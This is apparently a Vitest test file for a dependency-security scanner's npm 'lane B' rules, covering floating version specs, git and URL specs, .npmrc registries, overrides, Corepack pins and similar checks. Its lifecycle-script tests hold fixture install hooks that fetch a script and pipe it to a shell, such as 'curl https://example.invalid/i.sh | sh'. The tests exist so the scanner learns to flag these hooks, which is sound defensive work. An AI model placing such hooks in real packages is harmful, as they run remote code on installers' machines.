import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

import { afterEach, describe, expect, it } from 'vitest';

import { scan } from '../../../../../src/core/engine.js';
import { laneFindings, laneRows } from '../../../../../src/modules/deps/npm/lane-b.js';
import type { NpmDepthInput } from '../../../../../src/modules/deps/npm/types.js';
import type { Finding } from '../../../../../src/core/finding.js';

const cleanApp = join(process.cwd(), 'test', 'fixtures', 'clean-app');
const dirs: string[] = [];

const FLAG = {
  float: 'FULLSHIELD_EXPERIMENTAL_NPM_FLOAT',
  gitspec: 'FULLSHIELD_EXPERIMENTAL_NPM_GITSPEC',
  filespec: 'FULLSHIELD_EXPERIMENTAL_NPM_FILESPEC',
  urlspec: 'FULLSHIELD_EXPERIMENTAL_NPM_URLSPEC',
  tagspec: 'FULLSHIELD_EXPERIMENTAL_NPM_TAGSPEC',
  overrideVuln: 'FULLSHIELD_EXPERIMENTAL_NPM_OVERRIDE_VULN',
  overrideWide: 'FULLSHIELD_EXPERIMENTAL_NPM_OVERRIDE_WIDE',
  overrideAlias: 'FULLSHIELD_EXPERIMENTAL_NPM_OVERRIDE_ALIAS',
  lifecycle: 'FULLSHIELD_EXPERIMENTAL_NPM_LIFECYCLE',
  npmrcReg: 'FULLSHIELD_EXPERIMENTAL_NPM_NPMRC_REG',
  npmrcScript: 'FULLSHIELD_EXPERIMENTAL_NPM_NPMRC_SCRIPT',
  npmrcHome: 'FULLSHIELD_EXPERIMENTAL_NPM_NPMRC_HOME',
  packageManager: 'FULLSHIELD_EXPERIMENTAL_NPM_PACKAGEMANAGER',
  corepack: 'FULLSHIELD_EXPERIMENTAL_NPM_COREPACK',
  engines: 'FULLSHIELD_EXPERIMENTAL_NPM_ENGINES',
  engineStrict: 'FULLSHIELD_EXPERIMENTAL_NPM_ENGINE_STRICT',
  trusted: 'FULLSHIELD_EXPERIMENTAL_NPM_TRUSTED',
  publishConfig: 'FULLSHIELD_EXPERIMENTAL_NPM_PUBLISHCONFIG',
  binShadow: 'FULLSHIELD_EXPERIMENTAL_NPM_BINSHADOW',
  oscpu: 'FULLSHIELD_EXPERIMENTAL_NPM_OSCPU',
} as const;

const IDS = laneRows.map((row) => row.ruleId);

afterEach(async () => {
  for (const dir of dirs.splice(0)) {
    await rm(dir, { recursive: true, force: true });
  }
});

async function run(
  flag: string | undefined,
  files: Record<string, string>,
): Promise<Finding[]> {
  if (flag !== undefined) {process.env[flag] = '1';}
  const cwd = await mkdtemp(join(tmpdir(), 'fs-lane-b-'));
  dirs.push(cwd);
  const rels: string[] = [];
  for (const [rel, text] of Object.entries(files)) {
    const abs = join(cwd, rel);
    await mkdir(dirname(abs), { recursive: true });
    await writeFile(abs, text);
    rels.push(rel);
  }
  const lockTexts: Record<string, string> = {};
  for (const name of ['package-lock.json', 'npm-shrinkwrap.json', 'yarn.lock', 'pnpm-lock.yaml', 'bun.lock']) {
    const text = files[name];
    if (text !== undefined) {lockTexts[name] = text;}
  }
  const input: NpmDepthInput = {
    cwd,
    files: rels,
    manifestRaw: files['package.json'],
    lockTexts,
    cacheDir: join(cwd, 'cache'),
    offline: true,
  };
  return laneFindings(input);
}

function ids(findings: Finding[]): string[] {
  return findings.map((finding) => finding.ruleId);
}

function lock(packages: Record<string, unknown>): string {
  return JSON.stringify({ name: 'app', lockfileVersion: 3, packages });
}

describe('lane B rows', () => {
  it('lists one CWE row per rule id', () => {
    expect(laneRows).toHaveLength(23);
    expect(new Set(IDS).size).toBe(IDS.length);
    for (const row of laneRows) {
      expect(row.cwe).toMatch(/^CWE-/);
      expect(row.ruleId).toMatch(/^(DEPS|CONFIG)-[A-Z0-9-]+-\d{3}$/);
    }
  });
});

describe('phase 128 floating specs', () => {
  it('flags floating tokens and unbounded production specs', async () => {
    const findings = await run(FLAG.float, {
      'package.json': JSON.stringify({
        dependencies: {
          star: '*',
          ex: 'x',
          exbig: 'X',
          lat: 'latest',
          empty: '',
          ge: '>=1.2.3',
          gt: '>1.2.3',
          caret: '^1.2.3',
          tilde: '~1.2.3',
          exact: '1.2.3',
          bounded: '>=1.0.0 <2.0.0',
        },
        devDependencies: { devge: '>=1.0.0', devstar: '*' },
        optionalDependencies: { optge: '>=2.0.0' },
        peerDependencies: { peerge: '>=3.0.0' },
      }),
    });
    const wide = findings.filter((finding) => finding.ruleId === 'DEPS-FLOAT-001');
    const open = findings.filter((finding) => finding.ruleId === 'DEPS-FLOAT-002');
    expect(wide.map((finding) => finding.snippet).sort()).toEqual([
      'devstar@*',
      'empty@""',
      'ex@x',
      'exbig@X',
      'lat@latest',
      'star@*',
    ]);
    expect(wide.every((finding) => finding.severity === 'medium')).toBe(true);
    expect(open.map((finding) => finding.snippet).sort()).toEqual([
      'ge@>=1.2.3',
      'gt@>1.2.3',
      'optge@>=2.0.0',
    ]);
    expect(open.every((finding) => finding.severity === 'low')).toBe(true);
    expect(ids(findings).every((id) => id === 'DEPS-FLOAT-001' || id === 'DEPS-FLOAT-002')).toBe(true);
  });
});

describe('phase 129 git spec', () => {
  it('flags direct git protocols and does not emit the lockfile git id', async () => {
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_GITDEP = '1';
    const findings = await run(FLAG.gitspec, {
      'package.json': JSON.stringify({
        dependencies: {
          a: 'git:example.invalid/a',
          b: 'git+https://example.invalid/a/b.git',
          c: 'git+ssh://git@example.invalid/a/b.git',
          d: 'git+http://example.invalid/a/b.git',
          e: 'github:org/repo',
          f: 'gitlab:org/repo',
          g: 'bitbucket:org/repo',
          h: 'gist:abc123',
        },
      }),
      'package-lock.json': lock({
        '': { dependencies: { b: 'git+https://example.invalid/a/b.git' } },
        'node_modules/b': { version: '1.0.0', resolved: 'git+https://example.invalid/a/b.git' },
      }),
    });
    expect(findings).toHaveLength(8);
    expect(findings.every((finding) => finding.ruleId === 'DEPS-GITSPEC-001' && finding.severity === 'high')).toBe(true);
    expect(ids(findings)).not.toContain('DEPS-GITDEP-001');
  });

  it('ignores a semver range', async () => {
    const findings = await run(FLAG.gitspec, {
      'package.json': JSON.stringify({ dependencies: { left: '^1.2.3' } }),
    });
    expect(findings).toEqual([]);
  });
});

describe('phase 130 file spec', () => {
  it('flags file: and link: and does not emit the lockfile link id', async () => {
    process.env.FULLSHIELD_EXPERIMENTAL_NPM_LINKDEP = '1';
    const findings = await run(FLAG.filespec, {
      'package.json': JSON.stringify({
        dependencies: { local: 'file:../local', linked: 'link:./linked' },
      }),
    });
    expect(findings.map((finding) => finding.snippet).sort()).toEqual([
      'linked@link:./linked',
      'local@file:../local',
    ]);
    expect(findings.every((finding) => finding.ruleId === 'DEPS-FILESPEC-001' && finding.severity === 'medium')).toBe(true);
    expect(ids(findings)).not.toContain('DEPS-LINKDEP-001');
  });

  it('ignores a semver range', async () => {
    const findings = await run(FLAG.filespec, {
      'package.json': JSON.stringify({ dependencies: { left: '^1.2.3' } }),
    });
    expect(findings).toEqual([]);
  });
});

describe('phase 131 URL spec', () => {
  it('flags a non-registry http(s) URL', async () => {
    const findings = await run(FLAG.urlspec, {
      'package.json': JSON.stringify({
        dependencies: {
          http: 'http://example.invalid/pkg.tgz',
          https: 'https://example.invalid/pkg.tgz',
        },
      }),
    });
    expect(findings).toHaveLength(2);
    expect(findings.every((finding) => finding.ruleId === 'DEPS-URLSPEC-001' && finding.severity === 'high')).toBe(true);
  });

  it('ignores a semver range and a registry.npmjs.org tarball', async () => {
    const findings = await run(FLAG.urlspec, {
      'package.json': JSON.stringify({
        dependencies: {
          left: '^1.2.3',
          tar: 'https://registry.npmjs.org/left-pad/-/left-pad-1.2.3.tgz',
          clear: 'http://registry.npmjs.org/left-pad/-/left-pad-1.2.3.tgz',
        },
      }),
    });
    expect(findings).toEqual([]);
  });
});

describe('phase 132 dist-tag spec', () => {
  it('flags bare dist-tags and name@tag with no digit', async () => {
    const findings = await run(FLAG.tagspec, {
      'package.json': JSON.stringify({
        dependencies: {
          a: 'next',
          b: 'beta',
          c: 'canary',
          d: 'left-pad@next',
          e: '@scope/pkg@canary',
        },
      }),
    });
    expect(findings).toHaveLength(5);
    expect(findings.every((finding) => finding.ruleId === 'DEPS-TAGSPEC-001' && finding.severity === 'medium')).toBe(true);
  });

  it('ignores latest, a prerelease version, and a caret range', async () => {
    const findings = await run(FLAG.tagspec, {
      'package.json': JSON.stringify({
        dependencies: { a: 'latest', b: '1.2.3-beta.1', c: '^1.2.3', d: 'left-pad@1.2.3' },
      }),
    });
    expect(findings).toEqual([]);
  });
});

describe('phase 133 override vulnerable pin', () => {
  const vuln = JSON.stringify({
    fetchedAt: '2026-10-21T00:00:00.000Z',
    vulns: [{ id: 'GHSA-test-pin' }],
  });
  const empty = JSON.stringify({ fetchedAt: '2026-10-21T00:00:00.000Z', vulns: [] });

  it('cites the OSV id for overrides, resolutions, and pnpm.overrides', async () => {
    const manifests = [
      { overrides: { 'left-pad': '1.2.3' } },
      { resolutions: { '**/left-pad': '1.2.3' } },
      { pnpm: { overrides: { 'left-pad': { '.': '1.2.3' } } } },
    ];
    for (const manifest of manifests) {
      const findings = await run(FLAG.overrideVuln, {
        'package.json': JSON.stringify(manifest),
        'cache/osv/left-pad@1.2.3.json': vuln,
      });
      expect(findings).toHaveLength(1);
      expect(findings[0]).toMatchObject({ ruleId: 'DEPS-OVERRIDE-VULN-001', severity: 'high' });
      expect(findings[0]?.message).toContain('GHSA-test-pin');
    }
  });

  it('emits nothing when the cache is missing or vulns is empty', async () => {
    const missing = await run(FLAG.overrideVuln, {
      'package.json': JSON.stringify({ overrides: { 'left-pad': '1.2.3' } }),
    });
    const clear = await run(FLAG.overrideVuln, {
      'package.json': JSON.stringify({ overrides: { 'left-pad': '1.2.3' } }),
      'cache/osv/left-pad@1.2.3.json': empty,
    });
    expect(missing).toEqual([]);
    expect(clear).toEqual([]);
  });
});

describe('phase 134 wide override', () => {
  it('flags *, latest, and an unbounded floor', async () => {
    const findings = await run(FLAG.overrideWide, {
      'package.json': JSON.stringify({
        overrides: { a: '*', b: 'latest', c: '>=1.0.0', d: '>1.0.0', e: '^1.2.3', f: '1.2.3' },
      }),
    });
    expect(findings.map((finding) => finding.snippet).sort()).toEqual([
      'a@*',
      'b@latest',
      'c@>=1.0.0',
      'd@>1.0.0',
    ]);
    expect(findings.every((finding) => finding.ruleId === 'DEPS-OVERRIDE-WIDE-001' && finding.severity === 'medium')).toBe(true);
  });
});

describe('phase 135 override alias', () => {
  it('flags an npm: alias whose name differs from the key', async () => {
    const findings = await run(FLAG.overrideAlias, {
      'package.json': JSON.stringify({
        overrides: { left: 'npm:right@1.2.3', same: 'npm:same@1.2.3', exact: '1.2.3' },
      }),
    });
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({
      ruleId: 'DEPS-OVERRIDE-ALIAS-001',
      severity: 'high',
      snippet: 'left=>right@1.2.3',
    });
  });
});

describe('phase 136 lifecycle script', () => {
  it('flags downloaders and a URL piped to a shell', async () => {
    const findings = await run(FLAG.lifecycle, {
      'package.json': JSON.stringify({
        scripts: {
          preinstall: 'curl https://example.invalid/i.sh | sh',
          install: 'wget https://example.invalid/i.sh',
          postinstall: 'Invoke-WebRequest https://example.invalid/i.sh',
          prepare: 'echo https://example.invalid/i.sh | bash',
        },
      }),
    });
    expect(findings).toHaveLength(4);
    expect(findings.every((finding) => finding.ruleId === 'CONFIG-LIFECYCLE-001' && finding.module === 'config' && finding.severity === 'high')).toBe(true);
  });

  it('ignores a local node script', async () => {
    const findings = await run(FLAG.lifecycle, {
      'package.json': JSON.stringify({ scripts: { postinstall: 'node scripts/build.js' } }),
    });
    expect(findings).toEqual([]);
  });
});

describe('phase 137 project .npmrc registry', () => {
  it('flags a non-npm registry and a scoped registry', async () => {
    const findings = await run(FLAG.npmrcReg, {
      'package.json': '{}',
      '.npmrc': [
        '# comment',
        'registry=https://npm.example.invalid/root',
        '@scope:registry=https://scope.example.invalid/npm',
        '//npm.example.invalid/:_authToken=supersecret',
      ].join('\n'),
    });
    expect(findings.map((finding) => finding.snippet).sort()).toEqual([
      'registry host npm.example.invalid',
      'registry host scope.example.invalid',
    ]);
    expect(findings.every((finding) => finding.ruleId === 'DEPS-NPMRC-REG-001' && finding.severity === 'high')).toBe(true);
    expect(JSON.stringify(findings)).not.toContain('supersecret');
  });

  it('ignores the npm registry and a comment-only file', async () => {
    const official = await run(FLAG.npmrcReg, {
      'package.json': '{}',
      '.npmrc': 'registry=https://registry.npmjs.org/\n',
    });
    const comments = await run(FLAG.npmrcReg, {
      'package.json': '{}',
      '.npmrc': '# registry=https://npm.example.invalid/\n; also a comment\n',
    });
    expect(official).toEqual([]);
    expect(comments).toEqual([]);
  });
});

describe('phase 138 project .npmrc scripts', () => {
  it('flags ignore-scripts=false as info', async () => {
    const findings = await run(FLAG.npmrcScript, {
      'package.json': '{}',
      '.npmrc': 'ignore-scripts=false\n',
    });
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({ ruleId: 'DEPS-NPMRC-SCRIPT-001', severity: 'info' });
  });

  it('ignores ignore-scripts=true and a missing key', async () => {
    const enabled = await run(FLAG.npmrcScript, {
      'package.json': '{}',
      '.npmrc': 'ignore-scripts=true\n',
    });
    const absent = await run(FLAG.npmrcScript, {
      'package.json': '{}',
      '.npmrc': 'fund=false\n',
    });
    expect(enabled).toEqual([]);
    expect(absent).toEqual([]);
  });
});

describe('phase 139 home .npmrc registry', () => {
  it('reads FULLSHIELD_NPM_HOME and does not print tokens', async () => {
    const home = await mkdtemp(join(tmpdir(), 'fs-npm-home-'));
    dirs.push(home);
    await writeFile(join(home, '.npmrc'), 'registry=https://user:supersecret@npm.example.invalid/npm\n_authToken=supersecret\n');
    process.env.FULLSHIELD_NPM_HOME = home;
    const findings = await run(FLAG.npmrcHome, { 'package.json': '{}' });
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({
      ruleId: 'DEPS-NPMRC-HOME-001',
      severity: 'medium',
      file: '~/.npmrc',
      snippet: 'registry host npm.example.invalid',
    });
    expect(JSON.stringify(findings)).not.toContain('supersecret');
  });

  it('reads a listed home/.npmrc and ignores the npm registry', async () => {
    const listed = await run(FLAG.npmrcHome, {
      'package.json': '{}',
      'home/.npmrc': 'registry=https://npm.example.invalid/\n',
    });
    const official = await mkdtemp(join(tmpdir(), 'fs-npm-home-'));
    dirs.push(official);
    await writeFile(join(official, '.npmrc'), 'registry=https://registry.npmjs.org/\n');
    process.env.FULLSHIELD_NPM_HOME = official;
    const clean = await run(FLAG.npmrcHome, { 'package.json': '{}' });
    expect(listed).toHaveLength(1);
    expect(listed[0]?.ruleId).toBe('DEPS-NPMRC-HOME-001');
    expect(clean).toEqual([]);
  });

  it('does not read a home directory unless the env or home/.npmrc is set', async () => {
    const bait = await mkdtemp(join(tmpdir(), 'fs-npm-home-'));
    dirs.push(bait);
    await writeFile(join(bait, '.npmrc'), 'registry=https://npm.example.invalid/\n_authToken=supersecret\n');
    delete process.env.FULLSHIELD_NPM_HOME;
    const findings = await run(FLAG.npmrcHome, { 'package.json': '{}' });
    expect(findings).toEqual([]);
  });
});

describe('phase 140 packageManager', () => {
  const lockfile = lock({ '': { name: 'app', version: '1.0.0' } });

  it('flags a missing field when a lockfile exists, except a private caret-only manifest', async () => {
    const published = await run(FLAG.packageManager, {
      'package.json': JSON.stringify({ dependencies: { left: '^1.2.3' } }),
      'package-lock.json': lockfile,
    });
    const exactPrivate = await run(FLAG.packageManager, {
      'package.json': JSON.stringify({ private: true, dependencies: { left: '1.2.3' } }),
      'package-lock.json': lockfile,
    });
    const caretPrivate = await run(FLAG.packageManager, {
      'package.json': JSON.stringify({ private: true, dependencies: { left: '^1.2.3' } }),
      'package-lock.json': lockfile,
    });
    expect(published.map((finding) => finding.ruleId)).toEqual(['DEPS-PACKAGEMANAGER-001']);
    expect(published[0]?.severity).toBe('low');
    expect(exactPrivate.map((finding) => finding.ruleId)).toEqual(['DEPS-PACKAGEMANAGER-001']);
    expect(caretPrivate).toEqual([]);
  });

  it('flags a field that is not name@exact or that mismatches the lockfile', async () => {
    const mismatch = await run(FLAG.packageManager, {
      'package.json': JSON.stringify({ packageManager: 'yarn@4.1.1' }),
      'package-lock.json': lockfile,
    });
    const loose = await run(FLAG.packageManager, {
      'package.json': JSON.stringify({ packageManager: 'npm@latest' }),
      'package-lock.json': lockfile,
    });
    const pinned = await run(FLAG.packageManager, {
      'package.json': JSON.stringify({ packageManager: 'npm@10.9.2' }),
      'package-lock.json': lockfile,
    });
    const hashed = await run(FLAG.packageManager, {
      'package.json': JSON.stringify({ packageManager: 'npm@10.9.2+sha512.abc' }),
      'package-lock.json': lockfile,
    });
    expect(mismatch[0]).toMatchObject({ ruleId: 'DEPS-PACKAGEMANAGER-002', severity: 'medium' });
    expect(loose[0]?.ruleId).toBe('DEPS-PACKAGEMANAGER-002');
    expect(pinned).toEqual([]);
    expect(hashed).toEqual([]);
  });
});

describe('phase 141 Corepack integrity', () => {
  it('flags name@exact with no hash and no devEngines hash', async () => {
    const findings = await run(FLAG.corepack, {
      'package.json': JSON.stringify({ packageManager: 'npm@10.9.2' }),
    });
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({ ruleId: 'DEPS-COREPACK-001', severity: 'info' });
  });

  it('ignores a +sha512. suffix, a devEngines hash, and a missing field', async () => {
    const hashed = await run(FLAG.corepack, {
      'package.json': JSON.stringify({ packageManager: 'npm@10.9.2+sha512.abc' }),
    });
    const devEngines = await run(FLAG.corepack, {
      'package.json': JSON.stringify({
        packageManager: 'npm@10.9.2',
        devEngines: { packageManager: { name: 'npm', version: '10.9.2+sha512.abc' } },
      }),
    });
    const missing = await run(FLAG.corepack, {
      'package.json': JSON.stringify({ name: 'app' }),
    });
    expect(hashed).toEqual([]);
    expect(devEngines).toEqual([]);
    expect(missing).toEqual([]);
  });
});

describe('phase 142 engines vs pinned Node', () => {
  it('flags a pin the engines range does not include', async () => {
    const findings = await run(FLAG.engines, {
      'package.json': JSON.stringify({ engines: { node: '>=22.0.0' } }),
      '.nvmrc': 'v20.11.1\n',
    });
    const missing = await run(FLAG.engines, {
      'package.json': JSON.stringify({ name: 'app' }),
      '.node-version': '18.17.0\n',
    });
    expect(findings[0]).toMatchObject({ ruleId: 'CONFIG-ENGINES-001', severity: 'medium', module: 'config' });
    expect(missing[0]?.ruleId).toBe('CONFIG-ENGINES-001');
  });

  it('ignores an included pin, a missing pin file, and an unparseable range', async () => {
    const included = await run(FLAG.engines, {
      'package.json': JSON.stringify({ engines: { node: '>=20.0.0' } }),
      '.nvmrc': '20.11.1\n',
    });
    const noPin = await run(FLAG.engines, {
      'package.json': JSON.stringify({ engines: { node: '>=22.0.0' } }),
    });
    const unparsed = await run(FLAG.engines, {
      'package.json': JSON.stringify({ engines: { node: '>= 22.0.0' } }),
      '.nvmrc': '18.0.0\n',
    });
    const alias = await run(FLAG.engines, {
      'package.json': JSON.stringify({ engines: { node: '>=22.0.0' } }),
      '.nvmrc': 'lts/iron\n',
    });
    expect(included).toEqual([]);
    expect(noPin).toEqual([]);
    expect(unparsed).toEqual([]);
    expect(alias).toEqual([]);
  });
});

describe('phase 143 engine-strict', () => {
  it('flags engine-strict=false when engines.node is set', async () => {
    const findings = await run(FLAG.engineStrict, {
      'package.json': JSON.stringify({ engines: { node: '>=18.0.0' } }),
      '.npmrc': 'engine-strict=false\n',
    });
    expect(findings[0]).toMatchObject({ ruleId: 'DEPS-ENGINE-STRICT-001', severity: 'info' });
  });

  it('ignores engine-strict=true and a manifest with no engines field', async () => {
    const strict = await run(FLAG.engineStrict, {
      'package.json': JSON.stringify({ engines: { node: '>=18.0.0' } }),
      '.npmrc': 'engine-strict=true\n',
    });
    const noEngines = await run(FLAG.engineStrict, {
      'package.json': JSON.stringify({ name: 'app' }),
      '.npmrc': 'engine-strict=false\n',
    });
    expect(strict).toEqual([]);
    expect(noEngines).toEqual([]);
  });
});

describe('phase 144 trustedDependencies', () => {
  function project(trusted?: string[], hasInstallScript?: boolean): Record<string, string> {
    const manifest: Record<string, unknown> = { dependencies: { evil: '1.0.0' } };
    if (trusted !== undefined) {manifest.trustedDependencies = trusted;}
    const entry: Record<string, unknown> = { version: '1.0.0' };
    if (hasInstallScript !== undefined) {entry.hasInstallScript = hasInstallScript;}
    return {
      'package.json': JSON.stringify(manifest),
      '.npmrc': 'ignore-scripts=true\n',
      'package-lock.json': lock({
        '': { dependencies: { evil: '1.0.0' } },
        'node_modules/evil': entry,
      }),
    };
  }

  it('flags an install script that is not trusted', async () => {
    const findings = await run(FLAG.trusted, project(undefined, true));
    expect(findings[0]).toMatchObject({ ruleId: 'DEPS-TRUSTED-001', severity: 'medium', snippet: 'evil hasInstallScript' });
  });

  it('ignores a listed name, ignore-scripts that is not true, and a missing hasInstallScript', async () => {
    const listed = await run(FLAG.trusted, project(['evil'], true));
    const notIgnored = await run(FLAG.trusted, {
      ...project(undefined, true),
      '.npmrc': 'ignore-scripts=false\n',
    });
    const absent = await run(FLAG.trusted, project(undefined, undefined));
    const explicitFalse = await run(FLAG.trusted, project(undefined, false));
    expect(listed).toEqual([]);
    expect(notIgnored).toEqual([]);
    expect(absent).toEqual([]);
    expect(explicitFalse).toEqual([]);
  });
});

describe('phase 145 publishConfig', () => {
  it('flags a public package publishing off-registry and a private package set public', async () => {
    const registry = await run(FLAG.publishConfig, {
      'package.json': JSON.stringify({ publishConfig: { registry: 'https://npm.example.invalid/npm' } }),
    });
    const access = await run(FLAG.publishConfig, {
      'package.json': JSON.stringify({ private: true, publishConfig: { access: 'public' } }),
    });
    expect(registry[0]).toMatchObject({ ruleId: 'DEPS-PUBLISHCONFIG-001', severity: 'high' });
    expect(access[0]).toMatchObject({ ruleId: 'DEPS-PUBLISHCONFIG-002', severity: 'medium' });
  });

  it('ignores a private package with no publishConfig and a public npm registry', async () => {
    const priv = await run(FLAG.publishConfig, {
      'package.json': JSON.stringify({ private: true }),
    });
    const npm = await run(FLAG.publishConfig, {
      'package.json': JSON.stringify({ publishConfig: { registry: 'https://registry.npmjs.org/' } }),
    });
    expect(priv).toEqual([]);
    expect(npm).toEqual([]);
  });
});

describe('phase 146 bin name collision', () => {
  it('flags a Node builtin from node_modules or the packument cache, and a root bin', async () => {
    const local = await run(FLAG.binShadow, {
      'package.json': JSON.stringify({ dependencies: { left: '1.2.3' } }),
      'node_modules/left/package.json': JSON.stringify({ name: 'left', bin: { fs: 'index.js' } }),
    });
    const cached = await run(FLAG.binShadow, {
      'package.json': JSON.stringify({ dependencies: { left: '1.2.3' } }),
      'package-lock.json': lock({ 'node_modules/left': { version: '1.2.3' } }),
      'cache/registry/left.json': JSON.stringify({
        fetchedAt: '2026-10-21T00:00:00.000Z',
        packument: { versions: { '1.2.3': { bin: { path: 'bin.js' } } } },
      }),
    });
    const root = await run(FLAG.binShadow, {
      'package.json': JSON.stringify({
        name: 'app',
        bin: { 'my-cli': 'bin.js' },
        dependencies: { left: '1.2.3' },
      }),
      'node_modules/left/package.json': JSON.stringify({ name: 'left', bin: { 'my-cli': 'index.js' } }),
    });
    expect(local[0]).toMatchObject({ ruleId: 'DEPS-BIN-SHADOW-001', severity: 'medium', snippet: 'left bin fs' });
    expect(cached[0]?.snippet).toBe('left bin path');
    expect(root[0]?.snippet).toBe('left bin my-cli');
  });

  it('ignores my-cli, a missing manifest, and a local bin that hides a cached builtin', async () => {
    const plain = await run(FLAG.binShadow, {
      'package.json': JSON.stringify({ dependencies: { left: '1.2.3' } }),
      'node_modules/left/package.json': JSON.stringify({ name: 'left', bin: { 'my-cli': 'index.js' } }),
    });
    const absent = await run(FLAG.binShadow, {
      'package.json': JSON.stringify({ dependencies: { left: '1.2.3' } }),
    });
    const localWins = await run(FLAG.binShadow, {
      'package.json': JSON.stringify({ dependencies: { left: '1.2.3' } }),
      'package-lock.json': lock({ 'node_modules/left': { version: '1.2.3' } }),
      'node_modules/left/package.json': JSON.stringify({ name: 'left', bin: { 'my-cli': 'index.js' } }),
      'cache/registry/left.json': JSON.stringify({
        packument: { versions: { '1.2.3': { bin: { fs: 'bin.js' } } } },
      }),
    });
    expect(plain).toEqual([]);
    expect(absent).toEqual([]);
    expect(localWins).toEqual([]);
  });
});

describe('phase 147 os and cpu exclusion', () => {
  it('flags a direct production lock entry that excludes this platform', async () => {
    const findings = await run(FLAG.oscpu, {
      'package.json': JSON.stringify({ dependencies: { left: '1.2.3', right: '1.2.3' } }),
      'package-lock.json': lock({
        'node_modules/left': { version: '1.2.3', os: [`!${process.platform}`] },
        'node_modules/right': { version: '1.2.3', cpu: [`!${process.arch}`] },
      }),
    });
    expect(findings.map((finding) => finding.ruleId)).toEqual(['DEPS-OSCPU-001', 'DEPS-OSCPU-001']);
    expect(findings.every((finding) => finding.severity === 'info')).toBe(true);
    expect(findings[0]?.message).toContain(process.platform);
    expect(findings[1]?.message).toContain(process.arch);
  });

  it('ignores an included platform, an empty list, and a dev-only entry', async () => {
    const included = await run(FLAG.oscpu, {
      'package.json': JSON.stringify({ dependencies: { left: '1.2.3' } }),
      'package-lock.json': lock({
        'node_modules/left': { version: '1.2.3', os: [process.platform], cpu: [process.arch] },
      }),
    });
    const empty = await run(FLAG.oscpu, {
      'package.json': JSON.stringify({ dependencies: { left: '1.2.3' } }),
      'package-lock.json': lock({
        'node_modules/left': { version: '1.2.3', os: [], cpu: [] },
      }),
    });
    const dev = await run(FLAG.oscpu, {
      'package.json': JSON.stringify({ devDependencies: { left: '1.2.3' } }),
      'package-lock.json': lock({
        'node_modules/left': { version: '1.2.3', os: [`!${process.platform}`] },
      }),
    });
    expect(included).toEqual([]);
    expect(empty).toEqual([]);
    expect(dev).toEqual([]);
  });
});

describe('flags and clean-app', () => {
  it('emits none of these ids when every lane B flag is off', async () => {
    const findings = await run(undefined, {
      'package.json': JSON.stringify({
        dependencies: { left: '*', git: 'github:org/repo' },
        scripts: { postinstall: 'curl https://example.invalid/i.sh | sh' },
      }),
      '.npmrc': 'registry=https://npm.example.invalid/\nignore-scripts=false\n',
      'package-lock.json': lock({}),
    });
    expect(findings).toEqual([]);
    const cwd = await mkdtemp(join(tmpdir(), 'fs-lane-b-scan-'));
    dirs.push(cwd);
    await writeFile(join(cwd, 'package.json'), JSON.stringify({ dependencies: { left: '*' } }));
    await writeFile(join(cwd, 'package-lock.json'), lock({}));
    await writeFile(join(cwd, 'fullshield.config.json'), JSON.stringify({ deps: { offline: true, cacheDir: 'cache' } }));
    const scanned = await scan({ cwd, modules: ['deps'], offline: true });
    expect(scanned.findings.filter((finding) => IDS.includes(finding.ruleId))).toEqual([]);
  });

  it('clean-app emits none of these ids when every lane B flag is on', async () => {
    for (const flag of Object.values(FLAG)) {process.env[flag] = '1';}
    delete process.env.FULLSHIELD_NPM_HOME;
    const scanned = await scan({ cwd: cleanApp, modules: ['deps'], offline: true });
    expect(scanned.findings.filter((finding) => IDS.includes(finding.ruleId))).toEqual([]);
  });
});
